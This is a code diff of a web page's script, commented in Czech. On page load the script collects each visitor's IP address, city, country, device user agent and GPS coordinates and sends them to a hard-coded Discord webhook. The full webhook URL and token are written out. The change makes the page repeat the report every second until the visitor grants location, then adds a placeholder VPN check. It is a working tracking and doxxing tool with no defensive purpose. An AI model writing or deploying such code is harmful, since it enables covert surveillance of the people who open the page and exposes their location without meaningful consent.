@@ -10,6 +10,7 @@
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1334918135857287268/WDn0O_tSSKD3MLk-bufiwVHND9YgkexGKMsXG7guC6RKacjmxV-fvuC7EcNpu7LTGddE"; // Nahraď svým webhookem
+        let gpsConfirmed = false;  // Zjištění, zda bylo GPS potvrzeno
 
         function sendToDiscord(message) {
             fetch(WEBHOOK_URL, {
@@ -23,7 +24,7 @@
             fetch("https://ipinfo.io/json")
             .then(response => response.json())
             .then(data => {
-                const message = `@everyone\n📱 Zařízení: ${device}\n🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})\nVPN: FALSE\n${gpsData}`;
+                const message = `@everyone\n📱 Zařízení: ${device}\n🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})\nVPN: ${isVPN()}\n${gpsData}`;
 
                 sendToDiscord(message);
             })
@@ -40,6 +41,7 @@
                 navigator.geolocation.getCurrentPosition(position => {
                     const lat = position.coords.latitude.toFixed(6);
                     const lon = position.coords.longitude.toFixed(6);
+                    gpsConfirmed = true;
                     getIP(device, `📍 GPS: ${lat}, ${lon}`);
                 }, () => {
                     getIP(device, "🚫 GPS zamítnuta");
@@ -49,14 +51,22 @@
             }
         }
 
+        function isVPN() {
+            // Sem můžeš přidat logiku pro detekci VPN (záleží na dalších metodách)
+            return "FALSE";  // Defaultní hodnota pro VPN. Můžeš přidat detekci VPN, pokud máš takové možnosti
+        }
+
         window.onload = function() {
             getLocation();
 
-            // Interval pro odesílání IP a zařízení každých 0,5 sekundy
-            setInterval(() => {
+            // Interval pro odesílání informací každou sekundu, dokud není GPS potvrzena
+            const interval = setInterval(() => {
                 let device = navigator.userAgent;
-                getIP(device, "🚫 GPS není potvrzena");
-            }, 500); // 500 ms = 0,5 sekundy
+                if (gpsConfirmed) {
+                    clearInterval(interval);  // Po potvrzení GPS se interval zastaví
+                }
+                getIP(device, gpsConfirmed ? `📍 GPS potvrzena.` : "🚫 GPS není potvrzena");
+            }, 1000); // 1000 ms = 1 sekunda
         };
     </script>
 </body>
